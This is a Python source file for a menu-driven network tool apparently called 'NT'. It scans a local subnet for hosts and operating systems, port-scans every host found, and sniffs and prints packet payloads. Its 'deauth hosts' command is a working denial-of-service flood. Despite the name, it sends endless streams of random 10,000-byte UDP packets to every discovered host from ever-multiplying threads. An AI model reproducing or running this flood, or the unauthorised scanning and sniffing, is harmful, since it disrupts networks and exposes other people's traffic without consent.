from scapy.all import sniff, IP, TCP, UDP, ICMP
from datetime import datetime
import threading
import socket
import random
import psutil
import nmap
import sys
import os

banner = """
 /$$   /$$             /$$                                       /$$             /$$$$$$$$                  /$$
| $$$ | $$            | $$                                      | $$            |__  $$__/                 | $$
| $$$$| $$  /$$$$$$  /$$$$$$   /$$  /$$  /$$  /$$$$$$   /$$$$$$ | $$   /$$         | $$  /$$$$$$   /$$$$$$ | $$
| $$ $$ $$ /$$__  $$|_  $$_/  | $$ | $$ | $$ /$$__  $$ /$$__  $$| $$  /$$/         | $$ /$$__  $$ /$$__  $$| $$
| $$  $$$$| $$$$$$$$  | $$    | $$ | $$ | $$| $$  \ $$| $$  \__/| $$$$$$/          | $$| $$  \ $$| $$  \ $$| $$
| $$\  $$$| $$_____/  | $$ /$$| $$ | $$ | $$| $$  | $$| $$      | $$_  $$          | $$| $$  | $$| $$  | $$| $$
| $$ \  $$|  $$$$$$$  |  $$$$/|  $$$$$/$$$$/|  $$$$$$/| $$      | $$ \  $$         | $$|  $$$$$$/|  $$$$$$/| $$
|__/  \__/ \_______/   \___/   \_____/\___/  \______/ |__/      |__/  \__/         |__/ \______/  \______/ |__/
"""

help_menu = """
🔧 Command           | 📝 Description
════════════════════════════════════════════════════════
    help             | ❓ Help menu
    exit             | 🚪 Exit tool
    update           | 🔄 Update tool
    clear            | 🧹 Clear console
    simple host scan | 🔍 IP - MAC
    adv host scan    | 🔍 IP - MAC - OS NAME
    port scan        | 🔍 1-65535 open port scan
    deauth hosts     | 🚫 Disconnect all hosts from net
    sniff packets    | 👃 Sniff network packets
════════════════════════════════════════════════════════
"""


def set_title(title):
    if os.name == 'nt':
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    else:
        import sys
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def simple_host_scan():
    try:
        nm = nmap.PortScanner()
        nm.scan(hosts='192.168.1.0/24', arguments='-sn')

        def thread_scan(host):
            mac = nm[host]['addresses'].get('mac', 'N/A')
            print(f"{host} - {mac}")

        for host in nm.all_hosts():
            thread = threading.Thread(target=thread_scan, args=(host,))
            thread.start()

    except Exception as e:
        print(f"Error: {e}")


def adv_host_scan():
    try:
        nm = nmap.PortScanner()
        nm.scan(hosts='192.168.1.0/24', arguments='-O')

        def thread_scan(host):
            mac = nm[host]['addresses'].get('mac', 'N/A')
            os_name = nm[host]['osmatch'][0]['name'] if 'osmatch' in nm[host] and nm[host][
                'osmatch'] else "Unknown"

            print(f"{host} - {mac} - {os_name}")

        for host in nm.all_hosts():
            thread = threading.Thread(target=thread_scan, args=(host,))
            thread.start()

    except Exception as e:
        print(f"Error: {e}")


def deauth(host):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            payload = random.randbytes(10000)
            client_socket.sendto(payload, (host, 65535))
            print(f"\033[32m[+]\033[0m Sent {len(payload)} bytes to {host}")
        except:
            print(f"\033[31m[-]\033[0m {host}")


def scan_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)

    try:
        sock.connect((ip, port))
        print(f"\033[32m[+]\033[0m {ip}:{port}")
    except socket.error:
        pass
    finally:
        sock.close()


def scan_all_ports(ip):
    for port in range(1, 65535):
        thread = threading.Thread(target=scan_port, args=(ip, port))
        thread.start()


def get_hostname(ip):
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        return hostname
    except socket.herror:
        return ip


def packet_callback(packet):
    if IP in packet:
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst

        if TCP in packet:
            protocol = "TCP"
            sport = str(packet[TCP].sport)
            dport = str(packet[TCP].dport)
            data = packet[TCP].payload
        elif UDP in packet:
            protocol = "UDP"
            sport = str(packet[UDP].sport)
            dport = str(packet[UDP].dport)
            data = packet[UDP].payload
        elif ICMP in packet:
            protocol = "ICMP"
            sport = dport = "None"
            data = packet[ICMP].payload
        else:
            protocol = "Unknown"
            sport = dport = "None"
            data = "None"

        ip_src = get_hostname(ip_src)
        ip_dst = get_hostname(ip_dst)

        print(f"\033[93m[{protocol}]\033[0m \033[94m{ip_src}:{sport}\033[0m -> \033[94m{ip_dst}:{dport}\033[0m | {data}")


if __name__ == '__main__':
    clear()
    set_title("NT by Bt08s")
    current_time = datetime.now()
    formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")
    print(f"\033[36mUSR/HOST: {os.getlogin()}/{socket.gethostname()}, CPU/MEMORY: {int(psutil.cpu_percent())}%/{int(psutil.virtual_memory().percent)}%, Time: {formatted_time}\033[0m")
    print(banner)

    while True:
        cmd = input("nt> ")
        cmd = cmd.lower()

        if cmd in ["help", "?"]:
            print(help_menu)
        elif cmd == "exit":
            sys.exit()
        elif cmd == "update":
            print("Soon.")
        elif cmd == "clear":
            clear()
        elif cmd == "simple host scan":
            simple_host_scan()
        elif cmd == "adv host scan":
            adv_host_scan()

        elif cmd == "port scan":
            nm = nmap.PortScanner()
            nm.scan(hosts='192.168.1.0/24', arguments='-sn')

            threads = []
            for host in nm.all_hosts():
                thread = threading.Thread(target=scan_all_ports, args=(host,))
                thread.daemon = True
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

        elif cmd == "deauth hosts":
            nm = nmap.PortScanner()
            nm.scan(hosts='192.168.1.0/24', arguments='-sn')

            while True:
                for host in nm.all_hosts():
                    thread = threading.Thread(target=deauth, args=(host,))
                    thread.start()

        elif cmd == "sniff packets":
            sniff(prn=packet_callback, filter="ip")

        elif len(cmd) > 0:
            print("Invalid command. Type ? for help.")
